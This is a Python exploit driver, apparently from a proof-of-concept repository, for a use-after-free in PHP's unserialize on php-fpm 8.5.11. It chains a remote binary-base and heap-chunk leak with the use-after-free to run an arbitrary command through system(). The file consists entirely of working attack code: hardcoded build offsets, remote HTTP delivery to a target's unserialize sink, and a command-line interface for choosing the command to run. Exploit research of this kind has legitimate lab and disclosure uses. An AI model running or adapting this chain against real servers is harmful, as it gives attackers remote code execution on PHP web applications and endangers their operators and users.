#!/usr/bin/env python3
# INDEX: uaf rce, 8.5.11 build | fpm | pure | serialize+unserialize | build
"""Fully-remote, zero-local-seed, offset-free php-fpm RCE for one build.
CVE-2026-109618 / CVE-2026-109619 (unserialize var_hash UAF), php-fpm SAPI.

Wires two halves into one end-to-end chain with no /proc seed in the exploit
path: the write-free remote binbase+chunk leak (a var_hash write-through leaks a
chunk-interior pointer; a fixed-offset image pointer, read with the forged-
IS_STRING read, yields binbase) feeds straight into the offset-free fpm UAF->RCE
driver's run_fpm_chain. An alternative chunk source (--chunk-source 24481) takes
the zend_mm chunk base from the #24481 decimal heap-pointer leak instead; its
fully-remote delivery is still gated on a reflecting POP gadget. Imports the
project modules read-only; per-build constants are set by runtime attribute
assignment. Precondition: an unserialize()+echo-serialize sink. Pure stdlib,
safe under python3 -I. Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/

# re-derived 8.5.11-fpm constants
OBJ_CHUNK_OFF = 0x5b230
ZVAL_PTR_DTOR_OFF = 0x829460
STD_OBJ_HANDLERS_OFF = 0x1bff0a0


def _load(name, filename):
    """Import a committed poc module read-only (private, isolated instance)."""
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    # fpm_route does `import universal_remote_rce`; make sure it resolves.
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


def chunk_via_24481(image=None, decimal=None, remote=None, verbose=True, **kw):
    """Obtain the zend_mm chunk base via php-src #24481's decimal heap-pointer
    leak (an INDEPENDENT chunk source, no forged-IS_STRING read, no /proc, no
    write). Returns (chunk_base, ptr) or (None, None).

      * remote=(host,port,path) or a URL string -- FULLY REMOTE: fire the #24481
        dtor-reentry + reflecting POP gadget against the target's own sink over
        HTTP and scrape the reflected integer (var_destroy_24481_remote). No
        /proc, no local docker.
      * decimal=<int>  -- a leaked interior heap pointer the TARGET app already
        reflected as a JSON/serialize integer (supply it directly).
      * image=<docker>  -- run the #24481 harness locally to source the pointer
        (lab/validation provider)."""
    vd = _load("var_destroy_ptr_leak", "primitives/read_leak/var_destroy_ptr_leak.py")
    if remote is not None:
        vdr = _load("var_destroy_24481_remote", "bugs/var_destroy_24481_remote.py")
        if isinstance(remote, str):
            host, port, path = vdr._split_url(remote)
        else:
            host, port, path = remote
        rkw = {k: kw[k] for k in ("tries", "field", "nested", "filler",
                                  "groom", "cls") if k in kw}
        chunk, ptr, det = vdr.deliver_remote(host, port, path, verbose=verbose,
                                             **rkw)
        if verbose and chunk is not None:
            print(f"[#24481] REMOTE leak ptr=0x{ptr:x} -> chunk=0x{chunk:x} "
                  f"({det.get('reqs')} req)")
        return chunk, ptr
    if decimal is not None:
        ptr = int(decimal)
        return vd.chunk_base_from_leak(ptr), ptr
    if image:
        chunk, ptr, _ = vd.leak_chunk(image, **kw)
        if verbose and chunk is not None:
            print(f"[#24481] local-docker leak ptr=0x{ptr:x} -> chunk=0x{chunk:x}")
        return chunk, ptr
    return None, None


def leak_binbase_remote(host, port, path, tries=12, verbose=True,
                        chunk_override=None):
    """Phase 1: write-free remote binbase + chunk via the binbase leak.

    Returns (binbase, chunk, detail) or (None, None, detail). If `chunk_override`
    is given (e.g. from #24481's decimal channel), the forged read is NOT used to
    leak the chunk -- only to read the image pointer at chunk+OBJ_CHUNK_OFF for
    binbase (both the #24481 interior pointer and the engine's groom live in the
    same stable 2 MiB request chunk, so the masks agree)."""
    rleak = _load("fpm_binbase_leak", "primitives/read_leak/fpm_binbase_leak.py")
    # supply the 8.5.11 constants by attribute assignment (no file edit)
    rleak.OBJ_CHUNK_OFF = OBJ_CHUNK_OFF
    rleak.ZVAL_PTR_DTOR_OFF = ZVAL_PTR_DTOR_OFF
    rleak.STD_OBJ_HANDLERS_OFF = STD_OBJ_HANDLERS_OFF
    remote_rce = rleak._load_remote_rce()
    remote_rce.HOST, remote_rce.PORT, remote_rce.PATH = host, port, path
    if verbose:
        print("=" * 60)
        print("[Phase 1] write-free REMOTE binbase leak (no /proc, no write)")
    if chunk_override is not None:
        if verbose:
            print(f"[Phase 1] chunk from #24481 decimal channel = "
                  f"0x{chunk_override:x} (a7 reads image ptr only)")
        off, bb, ddet = rleak.derive_obj_off(remote_rce, chunk_override,
                                             leak_tries=tries, verbose=verbose)
        detail = {**ddet, "chunk": chunk_override, "chunk_source": "24481",
                  "leak_reqs": getattr(remote_rce, "req_count", None)}
        if bb is None:
            detail.setdefault("error", "#24481-chunk binbase derive failed")
            return None, chunk_override, detail
        ev = ddet.get("eval", {})
        detail.update(binbase=bb, obj_off=off, agree=ev.get("agree"),
                      confirm=ev.get("confirm"))
        return bb, chunk_override, detail
    binbase, detail = rleak.leak_binbase(remote_rce, leak_tries=tries, verbose=verbose)
    chunk = detail.get("chunk")
    detail["leak_reqs"] = getattr(remote_rce, "req_count", None)
    detail.setdefault("chunk_source", "remote_rce")
    return binbase, chunk, detail


def fire_rce_remote(host, port, path, binbase, chunk, cmd,
                    attempts=6, no_preflight=False, verbose=True):
    """Phase 2: feed the remote binbase+chunk into fpm_route and fire.

    Returns (ok, stats)."""
    rce = _load("fpm_route", "fpm_route.py")
    if verbose:
        print("=" * 60)
        print(f"[Phase 2] a7 UAF -> RCE with REMOTE binbase=0x{binbase:x} "
              f"chunk=0x{chunk:x}")
    rce.install_fpm_patches(host, port, path, binbase, enum=False)
    if not no_preflight and not rce.preflight_reflect(host, port, path):
        return False, {"error": "sink preflight failed"}
    ok, stats = rce.run_fpm_chain(host, port, path, binbase, cmd,
                                  chunk=chunk, attempts=attempts)
    return ok, stats


def full_chain(host, port, path, cmd, tries=12, attempts=6,
               no_preflight=False, verbose=True,
               chunk_source="remote_rce", chunk_decimal=None, chunk_image=None,
               chunk_remote=None):
    """End-to-end: remote leak -> remote RCE. No local seed at any step.

    chunk_source "remote_rce" (default) leaks the chunk via the forged R: read; "24481"
    sources it from php-src #24481's decimal heap-pointer channel instead:
      * chunk_remote = a URL (or (host,port,path)) of the target's #24481
        reflecting sink -- FULLY REMOTE delivery over HTTP (no /proc, no docker),
      * chunk_decimal = an app-reflected leaked pointer supplied directly,
      * chunk_image = a local docker provider.
    The forged read then reads only the image pointer at chunk+OBJ_CHUNK_OFF for
    binbase (both the #24481 pointer and the engine's groom live in the same
    stable per-process 2 MiB chunk, so the masks agree).

    Returns a dict with ok/binbase/chunk/leak_reqs/rce_reqs/elapsed."""
    t0 = time.time()
    chunk_override = None
    if chunk_source == "24481":
        chunk_override, ptr = chunk_via_24481(image=chunk_image,
                                              decimal=chunk_decimal,
                                              remote=chunk_remote,
                                              verbose=verbose, tries=tries)
        if chunk_override is None:
            return {"ok": False, "stage": "chunk",
                    "error": "#24481 chunk channel produced no pointer",
                    "elapsed": time.time() - t0}
    binbase, chunk, ld = leak_binbase_remote(host, port, path, tries=tries,
                                             verbose=verbose,
                                             chunk_override=chunk_override)
    if binbase is None:
        return {"ok": False, "stage": "leak",
                "error": ld.get("error"), "detail": ld,
                "elapsed": time.time() - t0}
    if verbose:
        print(f"[Phase 1] REMOTE binbase = 0x{binbase:x} "
              f"(chunk 0x{chunk:x}, {ld.get('agree')} image ptr)")
    ok, stats = fire_rce_remote(host, port, path, binbase, chunk, cmd,
                                attempts=attempts, no_preflight=no_preflight,
                                verbose=verbose)
    return {
        "ok": bool(ok),
        "stage": "fire",
        "binbase": binbase,
        "chunk": chunk,
        "chunk_source": ld.get("chunk_source"),
        "leak_agree": ld.get("agree"),
        "leak_reqs": ld.get("leak_reqs"),
        "rce_reqs": stats.get("total_reqs"),
        "rce_crashes": stats.get("total_crashes"),
        "libc_base": stats.get("libc_base"),
        "system": stats.get("system"),
        "elapsed": time.time() - t0,
        "stats": stats,
    }


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8131)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--cmd", default="id>/dev/shm/p",
                    help="command to run (<=14 bytes after the GC byte); "
                         "default writes an out-of-band marker")
    ap.add_argument("--tries", type=int, default=12)
    ap.add_argument("--attempts", type=int, default=6)
    ap.add_argument("--no-preflight", action="store_true")
    ap.add_argument("--chunk-source", choices=("remote_rce", "24481"), default="remote_rce",
                    help="where to source the zend_mm chunk base: remote_rce R: read "
                         "(default) or php-src #24481's decimal channel")
    ap.add_argument("--chunk-decimal", type=lambda s: int(s, 0), default=None,
                    help="#24481: a leaked interior heap pointer (app-reflected "
                         "integer) to mask to the chunk base")
    ap.add_argument("--chunk-image", default=None,
                    help="#24481: docker image to source the pointer locally "
                         "(lab provider) when no --chunk-decimal is given")
    ap.add_argument("--chunk-remote-url", default=None,
                    help="#24481: the target's reflecting-sink URL to deliver "
                         "the leak FULLY REMOTELY over HTTP (no /proc/docker); "
                         "e.g. http://127.0.0.1:8185/remote_app24481.php")
    args = ap.parse_args(argv)

    print(f"[fullchain] target http://{args.host}:{args.port}{args.path}")
    print("[fullchain] NO /proc / NO local seed: binbase is leaked remotely")
    if args.chunk_source == "24481":
        if args.chunk_remote_url is not None:
            src = "REMOTE HTTP " + args.chunk_remote_url
        elif args.chunk_decimal is not None:
            src = "supplied decimal"
        else:
            src = "docker " + str(args.chunk_image)
        print("[fullchain] chunk source: php-src #24481 channel (%s)" % src)
    r = full_chain(args.host, args.port, args.path, args.cmd,
                   tries=args.tries, attempts=args.attempts,
                   no_preflight=args.no_preflight,
                   chunk_source=args.chunk_source,
                   chunk_decimal=args.chunk_decimal,
                   chunk_image=args.chunk_image,
                   chunk_remote=args.chunk_remote_url)
    print("=" * 60)
    if not r["ok"] and r.get("stage") in ("leak", "chunk"):
        print(f"[fullchain] FAILED at {r['stage']}: {r.get('error')}")
        return 2
    print(f"[fullchain] fire delivered (in-band HTTP 200, worker survived): "
          f"{r['ok']}")
    print(f"[fullchain] binbase=0x{r['binbase']:x} chunk=0x{r['chunk']:x} "
          f"(chunk via {r.get('chunk_source')}, {r['leak_agree']} image ptr)")
    print(f"[fullchain] requests: leak~{r['leak_reqs']} + rce={r['rce_reqs']} "
          f"| crashes={r['rce_crashes']} | elapsed={r['elapsed']:.1f}s")
    if r["ok"]:
        print("[fullchain] in-band success: the fire returned a clean HTTP 200 "
              "and the worker survived (exit0 + a NULL-checking dispatch sink).")
    else:
        print("[fullchain] NOTE: --path here is a serialize() echo sink. The a7 "
              "fire runs system() (the --cmd marker lands, uid=www-data) but then "
              "SIGSEGVs the worker: serialize feeds get_properties_for's return "
              "straight into zend_array_count (no NULL check), and system() can "
              "never return a valid HashTable* -- so exit0 cannot save it here "
              "(gdb-verified, structural, 8.4.26 & 8.5.11). A worker-surviving, "
              "in-band-200 fire needs a NULL-checking dispatch sink instead "
              "(get_object_vars/(array)/foreach). Verify the marker out-of-band.")
    return 0 if r["ok"] else 1


if __name__ == "__main__":
    sys.exit(main())
